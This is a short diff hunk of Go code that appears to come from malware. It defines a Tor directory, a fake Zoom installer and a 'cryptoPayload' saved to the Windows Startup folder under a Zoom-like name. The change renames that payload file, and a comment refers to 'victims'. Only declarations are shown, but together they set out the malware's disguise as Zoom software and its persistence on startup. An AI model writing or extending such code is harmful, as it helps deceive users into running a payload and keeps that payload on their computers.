@@ -21,7 +21,7 @@ var (
 
     torDirectory  = workDir + `\Tor`
     zoomInstaller = tempDir + `\ZoomInstaller.exe`
-    cryptoPayload = win.StartupFolder() + `\ZoomUpdater.exe`
+    cryptoPayload = win.StartupFolder() + `\ZoomUp.exe`
 
     // cast magicBytes to array lol, very safe indeed
     // all victims will be on little endian systems anyway
